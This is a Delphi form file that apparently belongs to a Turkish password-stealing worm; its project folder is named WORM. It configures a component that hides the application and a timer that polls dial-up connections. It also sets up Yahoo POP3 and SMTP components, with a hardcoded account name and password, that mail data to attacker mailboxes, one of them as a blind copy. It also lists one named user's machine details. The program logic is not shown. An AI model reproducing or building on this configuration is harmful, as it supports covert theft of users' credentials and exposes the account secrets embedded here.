   object Form1: TForm1
     Left = 304
     Top = 105
     Width = 783
     Height = 540
     Caption = 'Form1'
     Color = clBtnFace
     Font.Charset = DEFAULT_CHARSET
     Font.Color = clWindowText
     Font.Height = -11
     Font.Name = 'MS Sans Serif'
     Font.Style = []
     OldCreateOrder = False
     OnCreate = FormCreate
     OnDestroy = FormDestroy
     PixelsPerInch = 96
     TextHeight = 13
     object memo1: TMemo
       Left = 16
       Top = 176
       Width = 193
       Height = 281
       Font.Charset = TURKISH_CHARSET
       Font.Color = clWindowText
       Font.Height = -11
       Font.Name = 'MS Sans Serif'
       Font.Style = []
       ParentFont = False
       TabOrder = 0
     end
     object Button1: TButton
       Left = 8
       Top = 16
       Width = 153
       Height = 25
       Caption = 'baðlandýktan sonra'
       TabOrder = 1
       OnClick = Button1Click
     end
     object h: TListView
       Left = 200
       Top = 16
       Width = 553
       Height = 137
       Columns = <
         item
           Caption = 'Name'
           Width = -1
           WidthType = (
             -1)
         end
         item
           Caption = 'Device type'
           Width = -1
           WidthType = (
             -1)
         end
         item
           Caption = 'Device name'
           Width = -1
           WidthType = (
             -1)
         end
         item
           Caption = 'Status'
           Width = -1
           WidthType = (
             -1)
         end>
       ColumnClick = False
       HideSelection = False
       TabOrder = 2
       ViewStyle = vsReport
     end
     object btnHangup: TButton
       Left = 504
       Top = 224
       Width = 73
       Height = 23
       Hint = 'RasHangUp'
       Caption = 'Hang up'
       Enabled = False
       ParentShowHint = False
       ShowHint = True
       TabOrder = 3
     end
     object btnActiveConn: TButton
       Left = 216
       Top = 184
       Width = 169
       Height = 33
       Hint = 'RasEnumConnections'
       Caption = 'baðlantý kontrolu yap'
       ParentShowHint = False
       ShowHint = True
       TabOrder = 4
       OnClick = btnActiveConnClick
     end
     object NMPOP31: TNMPOP3
       Host = 'pop.mail.yahoo.com'
       Port = 110
       ReportLevel = 0
       UserID = 'gelsinsifreler62'
       Parse = False
       Password = 'mikrop62'
       DeleteOnRead = False
       Left = 8
       Top = 128
     end
     object NMSMTP1: TNMSMTP
       Host = 'smtp.mail.yahoo.com'
       Port = 25
       ReportLevel = 0
       UserID = 'gelsinsifreler62'
       PostMessage.FromAddress = 'gelsinsifreler62@yahoo.com'
       PostMessage.FromName = 'KEK asd'
       PostMessage.ToAddress.Strings = (
         'gelsinsifreler62@yahoo.com')
       PostMessage.ToBlindCarbonCopy.Strings = (
         'gelsinsifreler@yahoo.com')
       EncodeType = uuMime
       ClearParams = True
       SubType = mtEnriched
       Charset = 'TURKISH_CHARSET'
       Left = 40
       Top = 128
     end
     object baglanti_kontrolu: TTimer
       Interval = 600000
       OnTimer = btnActiveConnClick
       Left = 72
       Top = 128
     end
     object baglandiktan_sonra: TTimer
       Enabled = False
       Interval = 2000
       OnTimer = Button1Click
       Left = 144
       Top = 128
     end
     object HideApp1: THideApp
       Left = 104
       Top = 128
     end
     object CP1: TCPUSpeed
       CPUSpeed = 450.982248
       NetworkOwner = 'HTS Inc.'
       NetworkUser = 'Mehmet Gezici'
       CPU = 'Intel Pentium'
       SysVersion = 'Windows 95'
       WinVersion = '4.90'
       WinBuild = '3000'
       MemorySize = '130.488 KB'
       MemoryFree = '1.024 KB'
       ResourcesFree = '2.021.760 KB'
       ResourcesSize = '2.093.056 KB'
       Drive = 'C'
       DriveSize = '2557324 KB'
       DriveFree = '682828 KB'
       SysDir = 'C:\WINDOWS\SYSTEM\'
       WinDir = 'C:\WINDOWS\'
       AppDir = 'C:\PROGRAM FILES\BORLAND\DELPHI5\BIN\'
       CurrentDir = 'D:\BELGELERIM\DELPHI\WORM\'
       Left = 432
       Top = 184
     end
     object Timer1: TTimer
       OnTimer = Timer1Timer
       Left = 392
       Top = 312
     end
   end
